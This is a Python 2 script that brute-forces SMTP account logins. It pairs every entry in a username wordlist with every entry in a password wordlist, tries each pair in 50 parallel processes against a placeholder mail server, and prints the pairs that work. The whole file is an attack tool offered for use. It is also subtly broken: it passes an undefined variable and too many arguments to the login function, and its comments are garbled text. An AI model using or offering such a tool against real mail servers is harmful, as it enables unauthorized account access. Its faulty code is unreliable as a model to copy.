#!/usr/bin/env python
# -*- coding: utf-8 -*-
from optparse import OptionParser 
import sys
from smtplib import SMTP,SMTP_SSL
import multiprocessing
     
# smtpµØÖ·
server = 'smtp.xxx.xx'

def smtpbrute(lock,user,passwd,port):
    smtp = SMTP()
    try:
        smtp.connect(server,port)
        smtp.login(user, passwd)
        print '[*]%s:%s ------> ok' % (user,passwd)
        smtp.quit()
    except Exception,e:
        pass

def main():
    lock = multiprocessing.Manager().Lock()
    p = multiprocessing.Pool(processes=50)
    parser = OptionParser()
    parser.add_option("-u", "--username",dest="userdic",help=u"smtpÕÊºÅ×Öµä")
    parser.add_option("-p", "--password",dest="passwdic",help=u"smtpÃÜÂë×Öµä")
    parser.add_option("-P", "--port",default=25,dest="port",type="int",help=u"smtp¶Ë¿ÚºÅ,Ä¬ÈÏ25")
    if len(sys.argv) == 1:
        parser.print_help()
    else:
        (options, args) = parser.parse_args()
        with open(options.userdic) as user:
            for i in user:
                with open(options.passwdic) as passwords:
                    for j in passwords:
                        p.apply_async(smtpbrute,args = (lock,i.strip(),j.strip(),k.strip(),options.port))
    p.close()
    p.join()
if __name__ == '__main__':
    main()